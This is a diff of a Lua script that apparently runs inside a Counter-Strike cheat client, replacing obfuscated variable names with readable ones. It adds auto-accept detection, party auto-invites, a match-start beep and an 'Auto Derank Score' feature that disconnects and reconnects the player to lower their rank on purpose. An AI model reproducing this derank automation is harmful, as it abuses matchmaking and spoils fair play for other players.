-		var_10_0.AutoAcceptDetection.enable = ui.new_checkbox("Lua", "B", "Auto Accept Detection")
-		var_10_0.AutoAcceptDetection.output = ui.new_multiselect("Lua", "B", "Output", {
-			"Party Chat",
-			"On-screen",
-			"Console"
-		})
+	--#region Auto Accept Detection
+	if ( Feature.get('Auto Accept Detection') ) then
+		CPLua.AutoAcceptDetection = {}
+		CPLua.AutoAcceptDetection.enable = ui.new_checkbox('Lua', 'B', 'Auto Accept Detection')
+		CPLua.AutoAcceptDetection.output = ui.new_multiselect('Lua', 'B', 'Output', {'Party Chat', 'On-screen', 'Console'})
+		
+		ui.set_visible(CPLua.AutoAcceptDetection.output, false)
+		ui.set(CPLua.AutoAcceptDetection.output, {'Party Chat', 'Console'})
 
-		ui.set_visible(var_10_0.AutoAcceptDetection.output, false)
-		ui.set(var_10_0.AutoAcceptDetection.output, {
-			"Party Chat",
-			"Console"
-		})
-		ui.set_callback(var_10_0.AutoAcceptDetection.enable, function(arg_25_0)
-			local var_25_0 = ui.get(arg_25_0)
-
-			ui.set_visible(var_10_0.AutoAcceptDetection.output, var_25_0)
+		ui.set_callback(CPLua.AutoAcceptDetection.enable, function(item)
+			local Status = ui.get(item)
+			ui.set_visible(CPLua.AutoAcceptDetection.output, Status)
 		end)
 
-		local var_10_5 = 1
+		local Count = 1
 
-		local function var_10_6()
-			var_10_5 = 1
+		local function ResetCount()
+			Count = 1
+			-- print('reset count to 1')
 		end
 
-		var_0_4.register_event("ShowAcceptPopup", var_10_6)
-		var_0_4.register_event("CloseAcceptPopup", var_10_6)
-		var_0_4.register_event("QueueConnectToServer", var_10_6)
+		panorama_events.register_event('ShowAcceptPopup', ResetCount)
+		panorama_events.register_event('CloseAcceptPopup', ResetCount)
+		panorama_events.register_event('QueueConnectToServer', ResetCount)
 
-		local var_10_7 = false
-		local var_10_8 = 0
-		local var_10_9 = false
+		local DrawPaintUI = false
+		local PaintUI_Accepts = 0
+		panorama_events.register_event('PanoramaComponent_Lobby_ReadyUpForMatch', function(shouldShow, playersReadyCount, numTotalClientsInReservation)
+			-- print('[AUTODETECTION] shouldShow:', shouldShow, ' playersReadyCount:', playersReadyCount, ' numTotalClientsInReservation:', numTotalClientsInReservation)
+			-- print('========================')
+			-- print('count=', count)
 
-		var_0_4.register_event("PanoramaComponent_Lobby_ReadyUpForMatch", function(arg_27_0, arg_27_1, arg_27_2)
-			if arg_27_0 and arg_27_1 == 0 then
-				if ui.get(var_10_0.AutoAcceptDetection.enable) then
-					print("Attempt accept")
+			--CPLua.ChatMethods['Party Chat']('[CSMITDEBUG] shouldShow:' .. tostring(shouldShow) .. ' playersReadyCount:' .. playersReadyCount .. ' numTotalClientsInReservation:' .. numTotalClientsInReservation)
+			if Count == 2 then
+				if ui.get(CPLua.AutoAcceptDetection.enable) then
+					-- print('Attempt accept')
+					LobbyAPI.SetLocalPlayerReady('accept')
+					for index, method in ipairs(ui.get(CPLua.AutoAcceptDetection.output)) do
+						if method == 'Party Chat' then
+							CPLua.ChatMethods['Party Chat']('[AUTOACCEPT] Detected ' .. playersReadyCount + 1 .. ' possible auto accepts!')
+						end
 
-					var_10_9 = true
+						if method == 'On-screen' then
+							DrawPaintUI = true
+							PaintUI_Accepts = playersReadyCount + 1
 
-					var_0_14.SetLocalPlayerReady("accept")
-				end
-			elseif var_10_9 and arg_27_1 > 1 then
-				for iter_27_0, iter_27_1 in ipairs(ui.get(var_10_0.AutoAcceptDetection.output)) do
-					if iter_27_1 == "Party Chat" then
-						var_10_0.ChatMethods["Party Chat"]("[AUTOACCEPT] Detected " .. arg_27_1 .. " possible auto accepts!")
-					end
+							client.delay_call(15, function()
+								DrawPaintUI = false
+								PaintUI_Accepts = 0
+							end)
+						end
 
-					if iter_27_1 == "On-screen" then
-						var_10_7 = true
-						var_10_8 = arg_27_1
-
-						client.delay_call(15, function()
-							var_10_7 = false
-							var_10_8 = 0
-						end)
-					end
-
-					var_10_9 = false
-
-					if iter_27_1 == "Console" then
-						print("[AUTOACCEPT] Detected " .. arg_27_1 .. " possible auto accepts!")
+						if method == 'Console' then
+							print('[AUTOACCEPT] Detected ' .. playersReadyCount + 1 .. ' possible auto accepts!')
+						end
 					end
 				end
 			end
-
-			var_10_5 = var_10_5 + 1
-
-			if not arg_27_0 then
-				var_10_6()
+			
+			Count = Count + 1
+			if not shouldShow then
+				ResetCount()
 			end
 		end)
-		client.set_event_callback("paint_ui", function()
-			if var_10_7 and var_10_8 > 0 then
-				local var_29_0, var_29_1 = client.screen_size()
 
-				renderer.text(var_29_0 / 2, var_29_1 / 2, 255, 0, 0, 255, "+c", 0, "Total auto accepts: " .. var_10_8)
+		client.set_event_callback('paint_ui', function()
+			if DrawPaintUI and PaintUI_Accepts > 0 then
+				local ScreenW, ScreenH = client.screen_size()
+				renderer.text(ScreenW/2, ScreenH/2, 255, 0, 0, 255, '+c', 0, 'Total auto accepts: ' .. PaintUI_Accepts)
 			end
 		end)
 	end
+	--#endregion
 
-	if var_0_18.get("Auto Derank Score") then
-		var_10_0.DerankScore = {}
-		var_10_0.DerankScore.enable = ui.new_checkbox("Lua", "B", "Auto Derank Score")
-		var_10_0.DerankScore.delay = ui.new_slider("Lua", "B", "\nAuto Derank Delay", 0, 15, 0, true, "s")
-		var_10_0.DerankScore.method = ui.new_multiselect("Lua", "B", "Method", {
-			"On Connect (beta)",
-			"Round Prestart",
-			"Round Start",
-			"During Timeout",
-			"Round End"
-		})
+	--#region Auto Derank Score
+	if ( Feature.get('Auto Derank Score') ) then
+		CPLua.DerankScore = {}
+		CPLua.DerankScore.enable = ui.new_checkbox('Lua', 'B', 'Auto Derank Score')
+		CPLua.DerankScore.delay = ui.new_slider('Lua', 'B', '\nAuto Derank Delay', 0, 15, 0, true, 's')
+		CPLua.DerankScore.method = ui.new_multiselect('Lua', 'B', 'Method', {'Round Prestart', 'Round Start', 'During Timeout', 'Round End'})
 
-		ui.set_visible(var_10_0.DerankScore.method, false)
-		ui.set_visible(var_10_0.DerankScore.delay, false)
-		ui.set_callback(var_10_0.DerankScore.enable, function(arg_30_0)
-			local var_30_0 = ui.get(arg_30_0)
+		ui.set_visible(CPLua.DerankScore.method, false)
+		ui.set_visible(CPLua.DerankScore.delay, false)
 
-			ui.set_visible(var_10_0.DerankScore.method, var_30_0)
-			ui.set_visible(var_10_0.DerankScore.delay, var_30_0)
+		ui.set_callback(CPLua.DerankScore.enable, function(self)
+			local Status = ui.get(self)
+			ui.set_visible(CPLua.DerankScore.method, Status)
+			ui.set_visible(CPLua.DerankScore.delay, Status)
 		end)
 
-		function var_10_0.DerankScore.MethodState(arg_31_0)
-			for iter_31_0, iter_31_1 in ipairs(ui.get(var_10_0.DerankScore.method)) do
-				if iter_31_1 == arg_31_0 then
+		function CPLua.DerankScore.MethodState(Method)
+			for index, value in ipairs(ui.get(CPLua.DerankScore.method)) do
+				if ( value == Method ) then
 					return true
 				end
 			end
-
 			return Found
 		end
 
-		function var_10_0.DerankScore.Reconnect()
-			if var_0_8.HasOngoingMatch() then
-				client.delay_call(ui.get(var_10_0.DerankScore.delay), function()
-					client.exec("disconnect")
-					var_0_8.ActionReconnectToOngoingMatch()
+		function CPLua.DerankScore.Reconnect()
+			if CompetitiveMatchAPI.HasOngoingMatch() then
+				client.delay_call(ui.get(CPLua.DerankScore.delay), function()
+					client.exec('disconnect')
+					CompetitiveMatchAPI.ActionReconnectToOngoingMatch()
 				end)
 			end
 		end
 
-		client.set_event_callback("player_connect_full", function()
-			if ui.get(var_10_0.DerankScore.enable) and var_10_0.DerankScore.MethodState("On Connect (beta)") and not var_0_10.IsGameInWarmup() then
-				var_10_0.DerankScore.Reconnect()
-			end
-		end)
 		client.set_event_callback("round_start", function()
-			if ui.get(var_10_0.DerankScore.enable) and var_10_0.DerankScore.MethodState("Round Prestart") then
-				var_10_0.DerankScore.Reconnect()
+			if ui.get(CPLua.DerankScore.enable) and CPLua.DerankScore.MethodState('Round Prestart') then
+				CPLua.DerankScore.Reconnect()
 			end
 		end)
+
 		client.set_event_callback("round_end", function()
-			if entity.is_alive(entity.get_local_player()) and ui.get(var_10_0.DerankScore.enable) and var_10_0.DerankScore.MethodState("Round End") then
-				var_10_0.DerankScore.Reconnect()
+			if entity.is_alive(entity.get_local_player()) and ui.get(CPLua.DerankScore.enable) and CPLua.DerankScore.MethodState('Round End') then
+				CPLua.DerankScore.Reconnect()
 			end
 		end)
+	
 		client.set_event_callback("round_freeze_end", function()
-			if entity.is_alive(entity.get_local_player()) and ui.get(var_10_0.DerankScore.enable) and var_10_0.DerankScore.MethodState("Round Start") then
-				var_10_0.DerankScore.Reconnect()
+			if entity.is_alive(entity.get_local_player()) and ui.get(CPLua.DerankScore.enable) and CPLua.DerankScore.MethodState('Round Start') then
+				CPLua.DerankScore.Reconnect()
 			end
 		end)
 
-		var_10_0.DerankScore.Deranking = false
-		var_10_0.loops[#var_10_0.loops + 1] = function()
-			if not var_10_0.DerankScore.Deranking and ui.get(var_10_0.DerankScore.enable) and var_10_0.DerankScore.MethodState("During Timeout") and var_0_10.IsGamePaused() and entity.is_alive(entity.get_local_player()) then
-				local var_38_0 = entity.get_prop(entity.get_game_rules(), "m_bCTTimeOutActive") == 1 and "CT" or entity.get_prop(entity.get_game_rules(), "m_bTerroristTimeOutActive") == 1 and "T" or false
-				local var_38_1 = 0
-
-				if var_38_0 == "CT" then
-					var_38_1 = entity.get_prop(entity.get_game_rules(), "m_flCTTimeOutRemaining")
-				elseif var_38_0 == "T" then
-					var_38_1 = entity.get_prop(entity.get_game_rules(), "m_flTerroristTimeOutRemaining")
+		CPLua.DerankScore.Deranking = false
+		CPLua.loops[#CPLua.loops + 1] = function()
+			if not CPLua.DerankScore.Deranking and ui.get(CPLua.DerankScore.enable) and CPLua.DerankScore.MethodState('During Timeout') and FriendsListAPI.IsGamePaused() and entity.is_alive(entity.get_local_player()) then
+				local Team = (entity.get_prop(entity.get_game_rules(), "m_bCTTimeOutActive") == 1 and 'CT' or false) or (entity.get_prop(entity.get_game_rules(), "m_bTerroristTimeOutActive") == 1 and 'T' or false)
+				local TimeoutRemaining = 0
+				if ( Team == 'CT' ) then
+					TimeoutRemaining = entity.get_prop(entity.get_game_rules(), "m_flCTTimeOutRemaining")
+				elseif ( Team == 'T' ) then
+					TimeoutRemaining = entity.get_prop(entity.get_game_rules(), "m_flTerroristTimeOutRemaining")
 				end
 
-				if var_38_1 > 0 then
-					var_10_0.DerankScore.Deranking = true
-
-					var_10_0.DerankScore.Reconnect()
+				if ( TimeoutRemaining > 0) then
+					CPLua.DerankScore.Deranking = true
+					CPLua.DerankScore.Reconnect()
 				end
 			end
 		end
-
-		client.set_event_callback("player_connect_full", function(arg_39_0)
-			if entity.get_local_player() == client.userid_to_entindex(arg_39_0.userid) then
-				var_10_0.DerankScore.Deranking = false
+		client.set_event_callback('player_connect_full', function(e)
+			if ( entity.get_local_player() == client.userid_to_entindex(e.userid) ) then
+				CPLua.DerankScore.Deranking = false
 			end
 		end)
 	end
+	--#endregion
 
-	if var_0_18.get("Auto Open CsgoStats.gg") then
-		var_10_0.AutoCSGOStats = {}
-		var_10_0.AutoCSGOStats.enable = ui.new_checkbox("Lua", "B", "Auto CSGOStats.gg")
+	--#region Auto Open CsgoStats.gg
+	if ( Feature.get('Auto Open CsgoStats.gg') ) then
+		CPLua.AutoCSGOStats = {}
+		CPLua.AutoCSGOStats.enable = ui.new_checkbox('Lua', 'B', 'Auto CSGOStats.gg')
 
-		var_0_4.register_event("ShowAcceptPopup", function(arg_40_0)
-			var_10_0.AutoCSGOStats.FirstJoin = true
-
-			printDebug("==> I am watching now")
+		panorama_events.register_event('ShowAcceptPopup', function(data)
+			CPLua.AutoCSGOStats.FirstJoin = true
+			printDebug('==> I am watching now')
 		end)
-		var_0_4.register_event("QueueConnectToServer", function()
-			printDebug("==> Queue Connect To Server", ui.get(var_10_0.AutoCSGOStats.enable), var_0_8.HasOngoingMatch())
-
-			if var_10_0.AutoCSGOStats.FirstJoin and ui.get(var_10_0.AutoCSGOStats.enable) and var_0_8.HasOngoingMatch() then
-				var_10_0.AutoCSGOStats.FirstJoin = false
-
-				var_0_15.OpenExternalBrowserURL("https://csgostats.gg/player/" .. var_0_13.GetXuid() .. "#/live")
+		panorama_events.register_event('QueueConnectToServer', function()
+			printDebug('==> Queue Connect To Server', ui.get(CPLua.AutoCSGOStats.enable), CompetitiveMatchAPI.HasOngoingMatch() )
+			if ( CPLua.AutoCSGOStats.FirstJoin and ui.get(CPLua.AutoCSGOStats.enable) and CompetitiveMatchAPI.HasOngoingMatch() ) then
+				CPLua.AutoCSGOStats.FirstJoin = false
+				SteamOverlayAPI.OpenExternalBrowserURL('https://csgostats.gg/player/' .. MyPersonaAPI.GetXuid() .. '#/live');
 			end
 		end)
 	end
+	--#endregion
 
-	if var_0_18.get("Auto Invite Recents") then
-		var_10_0.InviteRecents = {}
-		var_10_0.InviteRecents.enable = ui.new_checkbox("Lua", "B", "Auto Invite Recents")
-		var_10_0.InviteRecents.autostart = ui.new_checkbox("Lua", "B", "Start Queue On Join")
+	--#region Auto Invite Recents
+	if ( Feature.get('Auto Invite Recents') ) then
+		CPLua.InviteRecents = {}
+		CPLua.InviteRecents.enable = ui.new_checkbox('Lua', 'B', 'Auto Invite Recents')
+		CPLua.InviteRecents.autostart = ui.new_checkbox('Lua', 'B', 'Start Queue On Join')
 
-		ui.set_visible(var_10_0.InviteRecents.autostart, false)
-		ui.set_callback(var_10_0.InviteRecents.enable, function(arg_42_0)
-			printDebug(arg_42_0)
-			ui.set_visible(var_10_0.InviteRecents.autostart, ui.get(var_10_0.InviteRecents.enable))
+		ui.set_visible(CPLua.InviteRecents.autostart, false)
+
+		ui.set_callback(CPLua.InviteRecents.enable, function(status)
+			printDebug(status)
+			ui.set_visible(CPLua.InviteRecents.autostart, ui.get(CPLua.InviteRecents.enable))
 		end)
 
-		local var_10_10 = ""
-		local var_10_11 = false
+		local GameMode = ''
+		local refresh = false
+		panorama_events.register_event('EndOfMatch_Shutdown', function(data)	
+			GameMode = GameStateAPI.GetGameModeName(false)
+			if ( GameMode and CompetitiveMatchAPI.HasOngoingMatch() ) then
+				CPLua.InviteRecents.Reinvite = true
+				CPLua.InviteRecents.SessionReady = false
 
-		var_0_4.register_event("EndOfMatch_Shutdown", function(arg_43_0)
-			var_10_10 = var_0_9.GetGameModeName(false)
-
-			if var_10_10 and var_0_8.HasOngoingMatch() then
-				var_10_0.InviteRecents.Reinvite = true
-				var_10_0.InviteRecents.SessionReady = false
-
-				if not var_0_14.IsSessionActive() and ui.get(var_10_0.InviteRecents.enable) then
-					var_0_14.CreateSession()
-					var_0_12.SessionCommand("MakeOnline", "")
-
-					var_10_11 = true
+				if ( not LobbyAPI.IsSessionActive() and ui.get(CPLua.InviteRecents.enable) ) then
+					LobbyAPI.CreateSession()
+					PartyListAPI.SessionCommand('MakeOnline', '')
+					refresh = true
 				end
 			end
 		end)
-		var_0_4.register_event("PanoramaComponent_Lobby_MatchmakingSessionUpdate", function(arg_44_0)
-			if arg_44_0 == "ready" and var_10_11 then
-				local var_44_0 = {
-					update = {
-						Game = {}
-					}
-				}
-				local var_44_1 = var_0_11.GetConfig()
 
-				if var_10_10 == "Competitive" then
-					var_44_0.update.Game.mode = "competitive"
-					var_44_0.update.Game.type = "classic"
-				elseif var_10_10 == "Wingman" then
-					var_44_0.update.Game.mode = "scrimcomp2v2"
-					var_44_0.update.Game.type = "classic"
+		panorama_events.register_event('PanoramaComponent_Lobby_MatchmakingSessionUpdate', function(state)
+			if ( state == 'ready' and refresh ) then
+				local settings = { update = { Game = { } } }
+				local Config = GameTypesAPI.GetConfig()
+
+				-- print(GameMode .. '<<<<' )
+				if ( GameMode == 'Competitive' ) then
+					settings.update.Game.mode = 'competitive'
+					settings.update.Game.type = 'classic'
+				elseif ( GameMode == 'Wingman' ) then
+					settings.update.Game.mode = 'scrimcomp2v2'
+					settings.update.Game.type = 'classic'
 				end
+				settings.update.Game.mapgroupname = Config.gameTypes[settings.update.Game.type].gameModes[settings.update.Game.mode].mapgroupsMP
+				
+				LobbyAPI.UpdateSessionSettings(settings)
+				refresh = false
 
-				var_44_0.update.Game.mapgroupname = var_44_1.gameTypes[var_44_0.update.Game.type].gameModes[var_44_0.update.Game.mode].mapgroupsMP
-
-				var_0_14.UpdateSessionSettings(var_44_0)
-
-				var_10_11 = false
-
-				var_0_16.Refresh()
-
-				var_10_0.InviteRecents.SessionReady = true
+				TeammatesAPI.Refresh()
+				CPLua.InviteRecents.SessionReady = true
 			end
 		end)
-		var_0_4.register_event("PanoramaComponent_Teammates_Refresh", function()
-			if not var_0_14.BIsHost() then
-				return
-			end
 
-			panorama.loadstring("\t\t\t\tlet Recents = $.GetContextPanel().FindChildTraverse('JsFriendsList-recents').FindChild('JsFriendsList-List' );\n\t\t\t\tRecents.ScrollToBottom() \n\t\t\t\tRecents.ScrollToTop()\n\t\t\t", "CSGOMainMenu")()
+		panorama_events.register_event('PanoramaComponent_Teammates_Refresh', function()
+			if ( not LobbyAPI.BIsHost() ) then return end
 
-			var_10_0.InviteRecents.InviteCount = var_10_10 == "Competitive" and 3 or 0
+			panorama.loadstring([[
+				let Recents = $.GetContextPanel().FindChildTraverse('JsFriendsList-recents').FindChild('JsFriendsList-List' );
+				Recents.ScrollToBottom() 
+				Recents.ScrollToTop()
+			]], 'CSGOMainMenu')()
 
-			if var_10_0.InviteRecents.Reinvite and var_10_0.InviteRecents.SessionReady then
-				if ui.get(var_10_0.InviteRecents.enable) then
-					for iter_45_0 = 0, var_10_0.InviteRecents.InviteCount do
-						local var_45_0 = var_0_16.GetXuidByIndex(iter_45_0)
+			CPLua.InviteRecents.InviteCount = GameMode == 'Competitive' and 3 or 0
 
-						var_0_10.ActionInviteFriend(var_45_0, "")
+			if ( CPLua.InviteRecents.Reinvite and CPLua.InviteRecents.SessionReady ) then
+				if ( ui.get(CPLua.InviteRecents.enable) ) then
+					for Index=0, CPLua.InviteRecents.InviteCount do
+						local Teammate = TeammatesAPI.GetXuidByIndex(Index)
+						FriendsListAPI.ActionInviteFriend(Teammate, '')
 					end
 				end
-
-				var_10_0.InviteRecents.Reinvite = false
+				CPLua.InviteRecents.Reinvite = false
 			end
 		end)
-		var_0_4.register_event("PanoramaComponent_Lobby_PlayerJoined", function(arg_46_0)
-			if not var_0_14.BIsHost() then
-				return
-			end
 
-			local var_46_0 = var_0_14.GetSessionSettings().members.numSlots
-			local var_46_1 = var_10_10 == "Wingman" and 2 or 5
+		panorama_events.register_event('PanoramaComponent_Lobby_PlayerJoined', function(steamid)
+			if ( not LobbyAPI.BIsHost() ) then return end
 
-			if ui.get(var_10_0.InviteRecents.enable) and ui.get(var_10_0.InviteRecents.autostart) and var_0_12.GetCount() == var_46_1 then
-				var_0_14.StartMatchmaking("", "", "", "")
+			local numSlots = LobbyAPI.GetSessionSettings().members.numSlots
+			local maxSlots = GameMode == 'Wingman' and 2 or 5
+
+			if ( ui.get(CPLua.InviteRecents.enable) and ui.get(CPLua.InviteRecents.autostart) and PartyListAPI.GetCount() == maxSlots ) then				
+				LobbyAPI.StartMatchmaking('', 'ct', 't', '')
 			end
 		end)
 	end
+	--#endregion
 
-	if var_0_18.get("Match Start Beep") then
-		var_10_0.MatchStartBeep = {}
-		var_10_0.MatchStartBeep.enable = ui.new_checkbox("Lua", "B", "Match Start Beep")
-		var_10_0.MatchStartBeep.repeatTimes = ui.new_slider("Lua", "B", "Times (x)", 1, 30, 1)
-		var_10_0.MatchStartBeep.repeatInterval = ui.new_slider("Lua", "B", "Interval (ms)", 0, 1000, 250, true, "ms")
-		var_10_0.MatchStartBeep.delay = ui.new_slider("Lua", "B", "% of Match Freezetime", 0, 100, 75, true, "%")
-		var_10_0.MatchStartBeep.sounds = {
-			{
-				"popup_accept_match_beep",
-				"* Default (Beep)"
-			},
-			{
-				"PanoramaUI.Lobby.Joined",
-				"* Lobby Joined"
-			},
-			{
-				"PanoramaUI.Lobby.Left",
-				"* Lobby Left"
-			},
-			{
-				"popup_accept_match_waitquiet",
-				"* Match Accept Tick"
-			},
-			{
-				"popup_accept_match_person",
-				"* Match Accept Person"
-			},
-			{
-				"popup_accept_match_confirmed",
-				"* Match Confirmed"
-			},
-			{
-				"UIPanorama.generic_button_press",
-				"Generic Button"
-			},
-			{
-				"mainmenu_press_home",
-				"Home Button"
-			},
-			{
-				"tab_mainmenu_inventory",
-				"Inventory Tab"
-			},
-			{
-				"tab_settings_settings",
-				"Settings Tab"
-			},
-			{
-				"UIPanorama.mainmenu_press_quit",
-				"Quit Button"
-			},
-			{
-				"sticker_applySticker",
-				"Sticker Apply"
-			},
-			{
-				"sticker_nextPosition",
-				"Sticker Next Position"
-			},
-			{
-				"container_sticker_ticker",
-				"Container Sticker Ticker"
-			},
-			{
-				"container_weapon_ticker",
-				"Container Weapon Ticker"
-			},
-			{
-				"container_countdown",
-				"Container Countdown"
-			},
-			{
-				"inventory_inspect_sellOnMarket",
-				"Sell on Market"
-			},
-			{
-				"UIPanorama.sidemenu_select",
-				"Sidemenu Select"
-			},
-			{
-				"inventory_item_popupSelect",
-				"Item Popup"
-			},
-			{
-				"UIPanorama.stats_reveal",
-				"Stats Reveal"
-			},
-			{
-				"ItemRevealSingleLocalPlayer",
-				"Reveal Singleplayer"
-			},
-			{
-				"ItemDropCommon",
-				"Item Drop (Common)"
-			},
-			{
-				"ItemDropUncommon",
-				"Item Drop (Uncommon)"
-			},
-			{
-				"ItemDropMythical",
-				"Item Drop (Mythical)"
-			},
-			{
-				"ItemDropLegendary",
-				"Item Drop (Legendary)"
-			},
-			{
-				"ItemDropAncient",
-				"Item Drop (Ancient)"
-			},
-			{
-				"UIPanorama.XP.Ticker",
-				"XP Ticker"
-			},
-			{
-				"UIPanorama.XP.BarFull",
-				"XP Bar Full"
-			},
-			{
-				"UIPanorama.XP.NewRank",
-				"XP New Rank"
-			},
-			{
-				"UIPanorama.XP.NewSkillGroup",
-				"New Skill Group"
-			},
-			{
-				"UIPanorama.submenu_leveloptions_slidein",
-				"Map Vote SlideIn"
-			},
-			{
-				"UIPanorama.submenu_leveloptions_select",
-				"Map Vote Select"
-			},
-			{
-				"mainmenu_press_GO",
-				"Matchmaking Search"
-			},
-			{
-				"buymenu_select",
-				"Buy Select"
-			},
-			{
-				"UIPanorama.gameover_show",
-				"Gameover"
-			},
-			{
-				"inventory_item_select",
-				"Inventory Select"
-			},
-			{
-				"UIPanorama.inventory_new_item_accept",
-				"Inventory New Item"
-			},
-			{
-				"sidemenu_slidein",
-				"Sidemenu Slidein"
-			},
-			{
-				"sidemenu_slideout",
-				"Sidemenu Slideout"
-			},
-			{
-				"UIPanorama.inventory_new_item",
-				"Inventory New Item"
-			},
-			{
-				"inventory_inspect_weapon",
-				"Inventory Inspect Weapon"
-			},
-			{
-				"inventory_inspect_knife",
-				"Inventory Inspect Knife"
-			},
-			{
-				"inventory_inspect_sticker",
-				"Inventory Inspect Sticker"
-			},
-			{
-				"inventory_inspect_graffiti",
-				"Inventory Inspect Graffiti"
-			},
-			{
-				"inventory_inspect_musicKit",
-				"Inventory Inspect Music Kit"
-			},
-			{
-				"inventory_inspect_coin",
-				"Inventory Inspect Coin"
-			},
-			{
-				"inventory_inspect_gloves",
-				"Inventory Inspect Gloves"
-			},
-			{
-				"inventory_inspect_close",
-				"Inventory Inspect Close"
-			},
-			{
-				"XrayStart",
-				"XRay Start"
-			},
-			{
-				"rename_purchaseSuccess",
-				"Nametag Success"
-			},
-			{
-				"rename_select",
-				"Nametag Select"
-			},
-			{
-				"rename_teletype",
-				"Nametag Teletype"
-			},
-			{
-				"weapon_selectReplace",
-				"Weapon Select Replace"
-			},
-			{
-				"UIPanorama.popup_newweapon",
-				"New Weapon Popup"
-			}
+	--#region Match Start Beep
+	if ( Feature.get('Match Start Beep') ) then
+		CPLua.MatchStartBeep = {}
+		CPLua.MatchStartBeep.enable = ui.new_checkbox('Lua', 'B', 'Match Start Beep')
+		CPLua.MatchStartBeep.repeatTimes = ui.new_slider('Lua', 'B', 'Times (x)', 1, 30, 1)
+		CPLua.MatchStartBeep.repeatInterval = ui.new_slider('Lua', 'B', 'Interval (ms)', 0, 1000, 250, true, 'ms')
+		CPLua.MatchStartBeep.delay = ui.new_slider('Lua', 'B', '% of Match Freezetime', 0, 100, 75, true, '%')
+
+		CPLua.MatchStartBeep.sounds = {
+			{'popup_accept_match_beep', '* Default (Beep)'},
+			{'PanoramaUI.Lobby.Joined', '* Lobby Joined'},
+			{'PanoramaUI.Lobby.Left', '* Lobby Left'},
+			{'popup_accept_match_waitquiet', '* Match Accept Tick'},
+			{'popup_accept_match_person', '* Match Accept Person'},
+			{'popup_accept_match_confirmed', '* Match Confirmed'},
+			{'UIPanorama.generic_button_press', 'Generic Button'},
+			{'mainmenu_press_home', 'Home Button'},
+			{'tab_mainmenu_inventory', 'Inventory Tab'},
+			{'tab_settings_settings', 'Settings Tab'},
+			{'UIPanorama.mainmenu_press_quit', 'Quit Button'},
+			{'sticker_applySticker', 'Sticker Apply'},
+			{'sticker_nextPosition', 'Sticker Next Position'},
+			{'container_sticker_ticker', 'Container Sticker Ticker'},
+			{'container_weapon_ticker', 'Container Weapon Ticker'},
+			{'container_countdown', 'Container Countdown'},
+			{'inventory_inspect_sellOnMarket', 'Sell on Market'},
+			{'UIPanorama.sidemenu_select', 'Sidemenu Select'},
+			{'inventory_item_popupSelect', 'Item Popup'},
+			{'UIPanorama.stats_reveal', 'Stats Reveal'},
+			{'ItemRevealSingleLocalPlayer', 'Reveal Singleplayer'},
+			{'ItemDropCommon', 'Item Drop (Common)'},
+			{'ItemDropUncommon', 'Item Drop (Uncommon)'},
+			{'ItemDropMythical', 'Item Drop (Mythical)'},
+			{'ItemDropLegendary', 'Item Drop (Legendary)'},
+			{'ItemDropAncient', 'Item Drop (Ancient)'},
+			{'UIPanorama.XP.Ticker', 'XP Ticker'},
+			{'UIPanorama.XP.BarFull', 'XP Bar Full'},
+			{'UIPanorama.XP.NewRank', 'XP New Rank'},
+			{'UIPanorama.XP.NewSkillGroup', 'New Skill Group'},
+			{'UIPanorama.submenu_leveloptions_slidein', 'Map Vote SlideIn'},
+			{'UIPanorama.submenu_leveloptions_select', 'Map Vote Select'},
+			{'mainmenu_press_GO', 'Matchmaking Search'},
+			{'buymenu_select', 'Buy Select'},
+			{'UIPanorama.gameover_show', 'Gameover'},
+			{'inventory_item_select', 'Inventory Select'},
+			{'UIPanorama.inventory_new_item_accept', 'Inventory New Item'},
+			{'sidemenu_slidein', 'Sidemenu Slidein'},
+			{'sidemenu_slideout', 'Sidemenu Slideout'},
+			{'UIPanorama.inventory_new_item', 'Inventory New Item'},
+			{'inventory_inspect_weapon', 'Inventory Inspect Weapon'},
+			{'inventory_inspect_knife', 'Inventory Inspect Knife'},
+			{'inventory_inspect_sticker', 'Inventory Inspect Sticker'},
+			{'inventory_inspect_graffiti', 'Inventory Inspect Graffiti'},
+			{'inventory_inspect_musicKit', 'Inventory Inspect Music Kit'},
+			{'inventory_inspect_coin', 'Inventory Inspect Coin'},
+			{'inventory_inspect_gloves', 'Inventory Inspect Gloves'},
+			{'inventory_inspect_close', 'Inventory Inspect Close'},
+			{'XrayStart', 'XRay Start'},
+			{'rename_purchaseSuccess', 'Nametag Success'},
+			{'rename_select', 'Nametag Select'},
+			{'rename_teletype', 'Nametag Teletype'},
+			{'weapon_selectReplace', 'Weapon Select Replace'},
+			{'UIPanorama.popup_newweapon', 'New Weapon Popup'}
 		}
-
-		local var_10_12 = {}
-		local var_10_13 = {}
-
-		for iter_10_0, iter_10_1 in pairs(var_10_0.MatchStartBeep.sounds) do
-			var_10_12[#var_10_12 + 1] = iter_10_1[2]
-			var_10_13[iter_10_1[2]] = iter_10_1[1]
-		end
-
-		var_10_0.MatchStartBeep.sounds = ui.new_listbox("Lua", "B", "Sounds", var_10_12)
-		var_10_0.MatchStartBeep.testsound = ui.new_button("Lua", "B", "Test Sound", function()
-			local var_47_0 = var_10_12[ui.get(var_10_0.MatchStartBeep.sounds) + 1]
-
-			printDebug(var_47_0, ">", var_10_13[var_47_0])
-
-			if var_47_0 and var_47_0 ~= "" and var_10_13[var_47_0] then
-				var_10_0.MatchStartBeep.PlaySound()
+		local ProcessedSounds = {}
+		local ReferenceSounds = {}
+		for index, Sound in pairs(CPLua.MatchStartBeep.sounds) do
+			ProcessedSounds[#ProcessedSounds + 1] = Sound[2]
+			ReferenceSounds[Sound[2]] = Sound[1]
+		end	
+		CPLua.MatchStartBeep.sounds = ui.new_listbox('Lua', 'B', 'Sounds', ProcessedSounds)
+		CPLua.MatchStartBeep.testsound = ui.new_button('Lua', 'B', 'Test Sound', function()
+			local SelectedSound = ProcessedSounds[ui.get(CPLua.MatchStartBeep.sounds)+1]
+			printDebug(SelectedSound, '>', ReferenceSounds[SelectedSound])
+			if ( SelectedSound and SelectedSound ~= '' and ReferenceSounds[SelectedSound] ) then
+				CPLua.MatchStartBeep.PlaySound()
 			end
 		end)
 
-		ui.set_visible(var_10_0.MatchStartBeep.delay, false)
-		ui.set_visible(var_10_0.MatchStartBeep.sounds, false)
-		ui.set_visible(var_10_0.MatchStartBeep.testsound, false)
-		ui.set_visible(var_10_0.MatchStartBeep.repeatTimes, false)
-		ui.set_visible(var_10_0.MatchStartBeep.repeatInterval, false)
-		ui.set_callback(var_10_0.MatchStartBeep.enable, function(arg_48_0)
-			local var_48_0 = ui.get(arg_48_0)
+		ui.set_visible(CPLua.MatchStartBeep.delay, false)
+		ui.set_visible(CPLua.MatchStartBeep.sounds, false)
+		ui.set_visible(CPLua.MatchStartBeep.testsound, false)
 
